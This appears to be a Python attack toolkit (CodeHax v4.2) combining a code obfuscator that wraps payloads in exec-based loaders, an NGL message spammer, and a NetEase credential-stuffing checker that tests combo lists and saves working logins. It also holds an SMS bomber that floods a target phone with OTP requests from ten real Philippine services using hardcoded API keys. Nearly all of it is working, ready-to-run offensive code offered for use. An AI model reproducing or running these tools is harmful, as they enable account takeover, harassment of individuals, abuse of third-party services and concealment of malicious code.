#!/usr/bin/env python3
"""
Enhanced Universal Python Obfuscator / Decoder + NGL Spammer + Self‑Updater + NetEase Checker + SMS Bomber
Made by @ItsMeJeff, @Antraxdevz
v4.2
"""

import argparse
import base64
import dis
import hashlib
import importlib
import json
import logging
import marshal
import os
import random
import re
import shutil
import string
import struct
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import types
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from io import StringIO
from pathlib import Path
from typing import Optional, List, Callable, Tuple

import requests

# ----------------------------------------------------------------------
# Optional rich interface (falls back gracefully)
# ----------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.table import Table
    from rich.theme import Theme
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = None
    Panel = None
    Prompt = None
    Confirm = None
    Table = None
    Theme = None

# ----------------------------------------------------------------------
# Optional colorama (for NetEase checker)
# ----------------------------------------------------------------------
try:
    from colorama import init, Fore, Style
    init()
    COLORAMA_AVAILABLE = True
except ImportError:
    class DummyFore:
        RED = ''; GREEN = ''; YELLOW = ''; CYAN = ''; RESET = ''
    class DummyStyle:
        RESET_ALL = ''
    Fore = DummyFore()
    Style = DummyStyle()
    def init(): pass
    COLORAMA_AVAILABLE = False

# ----------------------------------------------------------------------
# Optional fake_useragent (for NetEase checker)
# ----------------------------------------------------------------------
try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except ImportError:
    UA_AVAILABLE = False

# ----------------------------------------------------------------------
# Logging
# ----------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("CodeHax")

# ----------------------------------------------------------------------
# Constants
# ----------------------------------------------------------------------
VERSION = "4.2"
UPDATE_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/main.py"
NGL_API_URL = "https://ngl.link/api/submit"

# ----------------------------------------------------------------------
# ASCII art for the main menu
# ----------------------------------------------------------------------
ASCII_ART = r"""
 __    __     __  __     __         ______   __        ______   ______     ______     __        
/\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       
\ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  
 \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ 
  \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/ 
"""

# ----------------------------------------------------------------------
# Console helpers (Rich or fallback)
# ----------------------------------------------------------------------
if RICH_AVAILABLE:
    console = Console()
else:
    class ConsoleFallback:
        def print(self, *args, **kwargs):
            print(*args)
    console = ConsoleFallback()

def rich_prompt(msg: str, default: str = "", choices: list = None) -> str:
    if RICH_AVAILABLE and Prompt:
        return Prompt.ask(msg, default=default, choices=choices)
    prompt = f"{msg} " + (f"({default}) " if default else "")
    resp = input(prompt)
    return resp if resp else default

def rich_confirm(msg: str, default: bool = True) -> bool:
    if RICH_AVAILABLE and Confirm:
        return Confirm.ask(msg, default=default)
    resp = input(f"{msg} (Y/n) ").strip().lower()
    if not resp:
        return default
    return resp in ("y", "yes")

# ----------------------------------------------------------------------
# Decoding engines
# ----------------------------------------------------------------------
def decode_layer_v1(encoded_str: str) -> Optional[str]:
    try:
        cleaned = encoded_str.strip().strip("'\"")
        b64_bytes = base64.b64decode(cleaned)
        reversed_str = b64_bytes.decode("utf-8")[::-1]
        compressed = base64.b64decode(reversed_str)
        return zlib.decompress(compressed).decode("utf-8")
    except Exception:
        return None

def extract_pyobfuscate_payload(source: str) -> Optional[str]:
    m = re.search(r"exec\(\(_\)\(b'([^']*)'\)\)", source)
    return m.group(1) if m else None

def try_uncompyle6(code_obj: types.CodeType) -> Optional[str]:
    try:
        from uncompyle6.main import decompile
    except ImportError:
        return None
    for ver in (3.12, 3.11, 3.10, 3.9, 3.8, 3.7, 3.6, 3.5, 2.7):
        try:
            buf = StringIO()
            decompile(ver, code_obj, out=buf)
            res = buf.getvalue().strip()
            if res:
                log.info(f"Decompiled with uncompyle6 (Python {ver})")
                return res
        except Exception:
            continue
    return None

def try_decompyle3(code_obj: types.CodeType) -> Optional[str]:
    try:
        from decompyle3.main import decompile as d3decomp
    except ImportError:
        return None
    for ver in (3.7, 3.8, 3.9, 3.10, 3.11):
        try:
            buf = StringIO()
            d3decomp(ver, code_obj, out=buf)
            res = buf.getvalue().strip()
            if res:
                log.info(f"Decompiled with decompyle3 (Python {ver})")
                return res
        except Exception:
            continue
    return None

def try_pycdc(code_obj: types.CodeType) -> Optional[str]:
    if not shutil.which("pycdc"):
        return None
    try:
        magic = importlib.util.MAGIC_NUMBER
        fd, tmp_path = tempfile.mkstemp(suffix=".pyc")
        with open(tmp_path, "wb") as f:
            f.write(magic)
            f.write(struct.pack("<i", int(time.time())))
            f.write(struct.pack("<i", len(marshal.dumps(code_obj))))
            f.write(marshal.dumps(code_obj))
        result = subprocess.run(
            ["pycdc", tmp_path],
            capture_output=True,
            text=True,
            timeout=15
        )
        os.unlink(tmp_path)
        if result.returncode == 0 and result.stdout.strip():
            log.info("Decompiled with pycdc")
            return result.stdout
    except Exception as e:
        log.debug(f"pycdc error: {e}")
    return None

def decompile_fallback(code_obj: types.CodeType) -> Optional[str]:
    out_path = Path("raw_bytecode.marshal")
    marshal.dump(code_obj, out_path.open("wb"))
    log.warning(f"All decompilers failed. Raw bytecode saved to {out_path}")
    try:
        buf = StringIO()
        dis.disassemble(code_obj, file=buf)
        lines = buf.getvalue().splitlines()[:20]
        snippet = "\n".join(lines)
        log.info(f"Disassembly preview:\n{snippet}")
    except Exception:
        pass
    return None

def decode_pyobfuscate_file(file_path: str) -> Optional[str]:
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    payload = extract_pyobfuscate_payload(content)
    if not payload:
        log.error("No PyObfuscate payload found.")
        return None
    reversed_payload = payload[::-1]
    try:
        compressed_data = base64.b64decode(reversed_payload)
    except Exception as e:
        log.error(f"Base64 decode failed: {e}")
        return None
    try:
        marshal_bytes = zlib.decompress(compressed_data)
    except Exception as e:
        log.error(f"zlib decompression failed: {e}")
        return None
    try:
        code_obj = marshal.loads(marshal_bytes)
    except Exception as e:
        log.error(f"marshal.loads failed: {e}")
        return None
    if not isinstance(code_obj, types.CodeType):
        log.error("Extracted object is not a code object.")
        return None
    for decompiler in (try_uncompyle6, try_decompyle3, try_pycdc):
        result = decompiler(code_obj)
        if result:
            return result
    return decompile_fallback(code_obj)

def auto_decode(file_path: str) -> Optional[str]:
    if not os.path.isfile(file_path):
        log.error(f"File not found: {file_path}")
        return None
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    if extract_pyobfuscate_payload(content):
        log.info("Detected PyObfuscate style.")
        return decode_pyobfuscate_file(file_path)
    m = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', content)
    if m:
        log.info("Detected Protected Loader v1.0 style.")
        decoded = decode_layer_v1(m.group(1))
        if decoded is None:
            log.error("Initial layer decoding failed.")
            return None
        while re.search(r'encoded\s*=\s*["\']', decoded):
            inner = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', decoded)
            if inner:
                decoded = decode_layer_v1(inner.group(1))
                if decoded is None:
                    log.error("Layer decoding failed.")
                    return None
            else:
                break
        return decoded
    log.info("No known header detected. Trying raw base64...")
    raw = content.strip().strip("'\"")
    decoded = decode_layer_v1(raw)
    if decoded:
        return decoded
    log.error("All decoding attempts failed.")
    return None

# ----------------------------------------------------------------------
# Obfuscation engines
# ----------------------------------------------------------------------
class Obfuscator:
    @staticmethod
    def one_layer_text(code: str) -> str:
        compressed = zlib.compress(code.encode("utf-8"))
        b64_1 = base64.b64encode(compressed).decode("ascii")
        reversed1 = b64_1[::-1]
        return base64.b64encode(reversed1.encode("ascii")).decode("ascii")

    @staticmethod
    def one_layer_marshal(code: str) -> str:
        code_obj = compile(code, "<obf>", "exec")
        marshal_data = marshal.dumps(code_obj)
        compressed = zlib.compress(marshal_data)
        b64_1 = base64.b64encode(compressed).decode("ascii")
        reversed1 = b64_1[::-1]
        return base64.b64encode(reversed1.encode("ascii")).decode("ascii")

    @staticmethod
    def generate_loader(payload: str, author: str = "@ItsMeJeff") -> str:
        return textwrap.dedent(f"""\
        # Author: {author}
        # Developer: {author}
        # Protected Code Loader

        import base64, zlib, sys

        def decode_me():
            print(\"\"\"
            ╔══════════════════════════════════════╗
            ║     Protected Python Loader v1.0     ║
            ║        Cracked By: {author:<12}║
            ║       Full credit: {author:<13}║
            ╚══════════════════════════════════════╝
            \"\"\")

        def decode_and_run():
            try:
                decode_me()
                encoded = "{payload}"
                layer1 = base64.b64decode(encoded.encode()).decode()
                layer2 = layer1[::-1]
                layer3 = base64.b64decode(layer2.encode())
                original = zlib.decompress(layer3).decode()
                exec(original, {{'__name__': '__main__'}})
            except Exception as e:
                print("Error:", e)
                sys.exit(1)

        if __name__ == "__main__":
            decode_and_run()
        """)

    @staticmethod
    def generate_marshal_loader(payload_b64: str, author: str = "@ItsMeJeff") -> str:
        return textwrap.dedent(f"""\
        # Author: {author}
        # Obfuscated with PyObfuscate style
        _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))
        exec((_)(b'{payload_b64}'))
        """)

    def obfuscate_file(self, source_path: str, mode: str = "marshal",
                       layers: int = 1, author: str = "@ItsMeJeff") -> str:
        if not os.path.isfile(source_path):
            raise FileNotFoundError(source_path)
        with open(source_path, "r", encoding="utf-8") as f:
            original_code = f.read()
        payload = original_code
        for i in range(layers):
            if mode == "marshal":
                payload = self.one_layer_marshal(payload)
            else:
                payload = self.one_layer_text(payload)
            log.info(f"Applied {mode} layer {i+1}/{layers}")
        final_code = self.generate_marshal_loader(payload, author) if mode == "marshal" \
                     else self.generate_loader(payload, author)
        out_path = Path(source_path).stem + "_obfuscated.py"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(final_code)
        log.info(f"Obfuscated file saved to {out_path}")
        return out_path

# ----------------------------------------------------------------------
# NGL Spammer
# ----------------------------------------------------------------------
class NGLSpammer:
    def __init__(self, username: str, message: str, quantity: int,
                 extra_message: str = None, proxies: List[str] = None,
                 threads: int = 10):
        self.username = username
        self.message = message
        self.extra_message = extra_message or message
        self.quantity = quantity
        self.proxies = proxies or []
        self.threads = threads
        self.success = 0
        self.failures = 0
        self.lock = threading.Lock()

    def _send_one(self, idx: int):
        session = requests.Session()
        if self.proxies:
            proxy = self.proxies[idx % len(self.proxies)]
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            "authority": "ngl.link",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://ngl.link",
            "referer": f"https://ngl.link/{self.username}",
            "x-requested-with": "XMLHttpRequest",
        }
        payload = {
            "username": self.username,
            "question": self.extra_message,
            "deviceId": "b8803802-3b9a-4f58-81dd-b0483418aecc",
            "gameSlug": "",
            "referrer": "",
        }
        try:
            resp = session.post(NGL_API_URL, headers=headers, data=payload, timeout=10)
            if resp.status_code == 200:
                with self.lock:
                    self.success += 1
                log.debug(f"✔ Sent #{idx+1}")
            else:
                with self.lock:
                    self.failures += 1
                log.debug(f"✖ Failed #{idx+1} (status {resp.status_code})")
        except Exception as e:
            with self.lock:
                self.failures += 1
            log.debug(f"✖ Exception #{idx+1}: {e}")
        time.sleep(0.2 + (hash(str(idx)) % 4) * 0.1)

    def run(self):
        log.info(f"Starting NGL spam: {self.quantity} messages to @{self.username}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._send_one, i) for i in range(self.quantity)]
            for future in as_completed(futures):
                future.result()
        log.info(f"Completed: {self.success} sent, {self.failures} failed.")

# ----------------------------------------------------------------------
# Netease Account Checker
# ----------------------------------------------------------------------
class NeteaseGamesChecker:
    def __init__(self, threads=10):
        self.session = requests.Session()
        self.threads = threads
        self.success = 0
        self.failed = 0
        self.invalid_pass = 0
        self.errors = 0
        self.counter_lock = threading.Lock()
        self.file_lock = threading.Lock()

    def get_md5(self, password):
        return hashlib.md5(password.encode()).hexdigest()

    def get_random_ua(self):
        if UA_AVAILABLE:
            return UserAgent().random
        fallback_uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        return random.choice(fallback_uas)

    def save_results(self, result_type, account, extra=""):
        with self.file_lock:
            with open(f"{result_type}.txt", "a") as f:
                f.write(f"{account} {extra}\n")

    def check_account(self, account_data):
        try:
            email, password = account_data.split(":", 1)
            email = email.strip()
            password = password.strip()

            md5_pwd = self.get_md5(password)
            random_ua = self.get_random_ua()

            login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
            login_data = {
                "account": email,
                "hash_password": md5_pwd,
                "client_id": "official",
                "response_type": "cookie",
                "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
                "state": "official_state"
            }
            headers = {
                "Pragma": "no-cache",
                "Accept": "*/*",
                "User-Agent": random_ua,
                "recaptcha-token": "HFaDRze01XOl9xfTpGRh5XR1MpM2ZsE0FzP2wvEUggGWxyPWRlA0JmGW9IWW5TK3EYfXVbDEcAQQFFcC4hdk0SbRE_Pz1bahN9KD9idQMjLBJ7ThUiRT9hQipjbBgXGzNTST91anc_CTFWbT5bSDsSOkd1YW5PM3BvaAUSbTx6eQsqeDZTRVAAHxp6byR7YzQhZQJDdFggGicjaTgyVGI3dChURScMSiteLDdrDEcHGjQUMmg2AykFamVcbBhZZgV8KX94PhkjOQR_WhEoQSEqUmttJkcHGzNTST91anc_CTElMxdUTjhSLDMjPkFGPGpXJFMCbTxwcTIWSHoAHwdXWgZ0bzA7DwQ9ezgzFDlxQzotZDRlAzcwXzxSSScMSixMPi57QFRedgZFYSlhYD4FemVZKEkIQ0crFmhuPAs-LyMsbgk_XH9RSFNkR00LDEcAD25ZLzx-aA"
            }

            r = self.session.post(login_url, data=login_data, headers=headers, timeout=10)
            response = r.json()

            with self.file_lock:
                with open("responses.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n{email}:{password}\n")
                    f.write(json.dumps(response, indent=2))
                    f.write("\n" + "=" * 50 + "\n")

            if response.get("code") == 1006:
                print(f"{Fore.RED}[INVALID] {email}:{password} - Incorrect password{Style.RESET_ALL}")
                with self.counter_lock:
                    self.invalid_pass += 1
                self.save_results("invalid", f"{email}:{password}", "Invalid password")
                return

            if "Account does not exist" in r.text:
                print(f"{Fore.RED}[FAIL] {email}:{password} - Account does not exist{Style.RESET_ALL}")
                with self.counter_lock:
                    self.failed += 1
                self.save_results("failed", f"{email}:{password}", "Account does not exist")
                return

            if response.get("code") == 0:
                info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
                info_headers = {
                    "User-Agent": random_ua,
                    "Pragma": "no-cache",
                    "Accept": "*/*"
                }
                r = self.session.get(info_url, headers=info_headers, timeout=10)
                info = r.json()
                user_id = info["user"]["user_id"]
                name = info["user"]["account_name"]
                location = info["user"]["location"]
                result = f"""
{Fore.GREEN}[SUCCESS] {email}:{password}
User ID: {user_id}
Name: {name}
Location: {location}{Style.RESET_ALL}"""
                print(result)
                with self.counter_lock:
                    self.success += 1
                self.save_results("success", f"{email}:{password}",
                                  f"ID:{user_id} | Name:{name} | Location:{location}")
            else:
                error_msg = response.get("message", "Unknown error")
                print(f"{Fore.RED}[FAIL] {email}:{password} - {error_msg}{Style.RESET_ALL}")
                with self.counter_lock:
                    self.failed += 1
                self.save_results("failed", f"{email}:{password}", error_msg)

        except Exception as e:
            print(f"{Fore.RED}[ERROR] {email}:{password} - {str(e)}{Style.RESET_ALL}")
            with self.counter_lock:
                self.errors += 1
            self.save_results("errors", f"{email}:{password}", str(e))

    def print_results(self):
        total = self.success + self.failed + self.invalid_pass + self.errors
        print(f"""
{Fore.CYAN}Results Summary:
Total Checked: {total}
Success: {Fore.GREEN}{self.success}{Fore.CYAN}
Failed: {Fore.RED}{self.failed}{Fore.CYAN}
Invalid Pass: {Fore.YELLOW}{self.invalid_pass}{Fore.CYAN}
Errors: {Fore.RED}{self.errors}{Fore.CYAN}

Results saved to:
- success.txt
- failed.txt
- invalid.txt
- errors.txt
- responses.txt{Style.RESET_ALL}
""")

    def start(self, filename=None):
        if not filename:
            filename = input(f"{Fore.YELLOW}Enter accounts file name: {Style.RESET_ALL}")
        try:
            with open(filename) as f:
                accounts = f.read().splitlines()
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] File not found!{Style.RESET_ALL}")
            return
        print(f"\n{Fore.CYAN}Loaded {len(accounts)} accounts{Style.RESET_ALL}\n")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.check_account, accounts)
        self.print_results()

# ----------------------------------------------------------------------
# SMS Bomber (TOSHI PREMIUM)
# ----------------------------------------------------------------------
@dataclass
class APIResponse:
    service_name: str
    success: bool
    status_code: Optional[int] = None
    error_message: Optional[str] = None

class SmsBomber:
    def __init__(self, max_retries=3, retry_delay=1, workers=8):
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.workers = workers
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
        self.FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
        self.logger = log  # reuse global logger

    def _random_string(self, length: int) -> str:
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def validate_phone_number(self, number: str) -> bool:
        return bool(re.match(r'^(09\d{9}|9\d{9})$', number))

    def format_phone_number(self, number: str) -> str:
        if number.startswith('0'):
            return '+63' + number[1:]
        return '+63' + number

    def _make_api_request(self, api_call, *args, **kwargs) -> APIResponse:
        service_name = kwargs.pop('service_name', 'Unknown')
        for attempt in range(self.max_retries + 1):
            try:
                result = api_call(*args)
                if isinstance(result, tuple) and len(result) == 3:
                    name, success, code = result
                    return APIResponse(service_name=name, success=success, status_code=code)
                return APIResponse(service_name=service_name, success=False,
                                   error_message="Invalid API response format")
            except requests.exceptions.RequestException as e:
                if attempt == self.max_retries:
                    return APIResponse(service_name=service_name, success=False,
                                       error_message=f"Network error: {str(e)}")
                time.sleep(self.retry_delay * (attempt + 1))
            except Exception as e:
                return APIResponse(service_name=service_name, success=False,
                                   error_message=f"Unexpected error: {str(e)}")
        return APIResponse(service_name=service_name, success=False, error_message="Max retries exceeded")

    # ------------------------------------------------------------------
    # Individual service methods (kept identical, minor cleanups)
    # ------------------------------------------------------------------
    def _send_s5(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.s5.com/player/api/v1/otp/request'
            boundary = "----WebKitFormBoundary" + self._random_string(16)
            data = (f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n'
                    f'{formatted_num}\r\n--{boundary}--\r\n')
            headers = {
                'authority': 'api.s5.com',
                'accept': 'application/json, text/plain, */*',
                'content-type': f'multipart/form-data; boundary={boundary}',
                'origin': 'https://www.s5.com',
                'referer': 'https://www.s5.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36',
                'x-api-type': 'external',
                'x-locale': 'en',
                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                'x-timezone-offset': '480'
            }
            resp = requests.post(url, data=data, headers=headers, timeout=10)
            return "S5.com", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "S5.com", False, None

    def _send_xpress(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp"
            data = {
                "FirstName": "toshi", "LastName": "premium",
                "Email": f"toshi{int(time.time())}@gmail.com",
                "Phone": formatted_num,
                "Password": "ToshiPass123", "ConfirmPassword": "ToshiPass123",
                "ImageUrl": "", "RoleIds": [4], "Area": "manila", "City": "manila",
                "PostalCode": "1000", "Street": "toshi_street", "ReferralCode": "",
                "FingerprintVisitorId": self.FINGERPRINT_VISITOR_ID,
                "FingerprintRequestId": self.FINGERPRINT_REQUEST_ID,
            }
            headers = {
                "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart",
                "Accept": "application/json", "Content-Type": "application/json",
                "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce",
                "Cookie": "ApplicationGatewayAffinityCORS=9af1ffd531ed95805ec09cbdf3793dd6; "
                          "ApplicationGatewayAffinity=9af1ffd531ed95805ec09cbdf3793dd6",
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Xpress PH", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Xpress PH", False, None

    def _send_abenson(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.mobile.abenson.com/api/public/membership/activate_otp'
            data = f'contact_no={number_to_send}&login_token=undefined'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'com.abensonmembership.cloone',
                'origin': 'https://localhost',
                'referer': 'https://localhost/'
            }
            resp = requests.post(url, data=data, headers=headers, timeout=10)
            return "Abenson", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Abenson", False, None

    def _send_excellente(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock'
            coords = [{'lat': '14.5995', 'long': '120.9842'},
                      {'lat': '14.6760', 'long': '121.0437'},
                      {'lat': '14.8648', 'long': '121.0418'}]
            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1',
                      'Dart/3.6 (dart:io)', 'Mozilla/5.0 (Linux; Android 15)']
            coord = random.choice(coords)
            agent = random.choice(agents)
            data = {
                "domain": number_to_send,
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }
            headers = {
                'User-Agent': agent,
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/json; charset=utf-8',
                'x-version': '1.1.2',
                'x-package-name': 'com.support.excellenteralending',
                'x-adid': 'efe35521e51f924efcad5d61d61072a9',
                'x-latitude': coord['lat'],
                'x-longitude': coord['long']
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Excellente Lending", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Excellente Lending", False, None

    def _send_fortunepay(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register'
            data = {
                "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
                "deviceType": 'GOOGLE_PLAY',
                "companyId": '4bf735e97269421a80b82359e7dc2288',
                "dialCode": '+63',
                "phoneNumber": number_to_send.lstrip('0')
            }
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
                'app-version': '4.3.5',
                'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
                'timestamp': str(int(time.time() * 1000)),
                'nonce': f"{self._random_string(10)}-{int(time.time() * 1000)}"
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "FortunePay", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "FortunePay", False, None

    def _send_wemove(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.wemove.com.ph/auth/users'
            data = {
                "phone_country": '+63',
                "phone_no": number_to_send.lstrip('0')
            }
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "WeMove", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "WeMove", False, None

    def _send_lbc(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'
            data = {
                'verification_type': 'mobile',
                'client_email': f'{self._random_string(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': number_to_send.lstrip('0'),
                'app_log_uid': self._random_string(16),
                'app_token': '',
                'app_platform': 'Android',
                'app_ip': '103.167.66.190',
                'device_name': 'rosemary_p_global',
                'device_os': 'Android15',
                'device_brand': 'Xiaomi',
                'app_version': '3.0.67',
                'app_framework': 'lbc_app',
                'app_environment': 'production',
                'app_hash': self._random_string(32),
                'app_network': 'android-parameter'
            }
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'api': 'LBC',
                'token': 'CONNECT'
            }
            resp = requests.post(url, data=data, headers=headers, timeout=10)
            return "LBC", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "LBC", False, None

    def _send_pickup_coffee(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://production.api.pickup-coffee.net/v2/customers/login'
            data = {"mobile_number": formatted_num, "login_method": "mobile_number"}
            headers = {
                'User-Agent': random.choice(['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1',
                                             'Dart/3.6 (dart:io)', 'Mozilla/5.0 (Linux; Android 15)']),
                'Content-Type': 'application/json',
                'x-env': 'Production',
                'x-app-version': random.choice(['2.6.4', '2.6.5', '2.7.0'])
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Pickup Coffee", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Pickup Coffee", False, None

    def _send_honeyloan(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.honeyloan.ph/api/client/registration/step-one'
            data = {"phone": number_to_send, "is_rights_block_accepted": 1}
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2207117BPG) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'origin': 'https://honeyloan.ph',
                'referer': 'https://honeyloan.ph/',
                'x-requested-with': 'com.startupcalculator.caf'
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "HoneyLoan", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "HoneyLoan", False, None

    def _send_komo(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.komo.ph/api/otp/v5/generate'
            data = {"mobile": number_to_send, "transactionType": 6}
            headers = {
                'Connection': 'close',
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Komo", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Komo", False, None

    def _get_all_services(self, formatted_num: str, number_to_send: str) -> List[Callable]:
        """Return lambdas that call each service with the correct number."""
        return [
            lambda: self._make_api_request(self._send_s5, formatted_num, service_name="S5.com"),
            lambda: self._make_api_request(self._send_xpress, formatted_num, service_name="Xpress PH"),
            lambda: self._make_api_request(self._send_abenson, number_to_send, service_name="Abenson"),
            lambda: self._make_api_request(self._send_excellente, number_to_send, service_name="Excellente Lending"),
            lambda: self._make_api_request(self._send_fortunepay, number_to_send, service_name="FortunePay"),
            lambda: self._make_api_request(self._send_wemove, number_to_send, service_name="WeMove"),
            lambda: self._make_api_request(self._send_lbc, number_to_send, service_name="LBC"),
            lambda: self._make_api_request(self._send_pickup_coffee, formatted_num, service_name="Pickup Coffee"),
            lambda: self._make_api_request(self._send_honeyloan, number_to_send, service_name="HoneyLoan"),
            lambda: self._make_api_request(self._send_komo, number_to_send, service_name="Komo"),
        ]

    def _display_real_time_stats(self):
        elapsed = time.time() - self.start_time
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests else 0
        req_per_sec = self.total_requests / elapsed if elapsed else 0
        print(f'\n📊 STATS | ✅ {self.successful_requests} ❌ {self.failed_requests} 📦 {self.total_requests}')
        print(f'📈 {success_rate:.1f}% | ⚡ {req_per_sec:.1f} req/s | ⏱ {elapsed:.1f}s')
        print('-' * 60)

    def _display_final_report(self, number_to_send):
        elapsed = time.time() - self.start_time
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests else 0
        req_per_sec = self.total_requests / elapsed if elapsed else 0
        print('\n' + '=' * 60)
        print('🎯 SMS BOMBING COMPLETE')
        print('=' * 60)
        print(f'📞 Target: {number_to_send}')
        print(f'✅ Success: {self.successful_requests}')
        print(f'❌ Failed:  {self.failed_requests}')
        print(f'📦 Total:   {self.total_requests}')
        print(f'📈 Rate:    {success_rate:.1f}%')
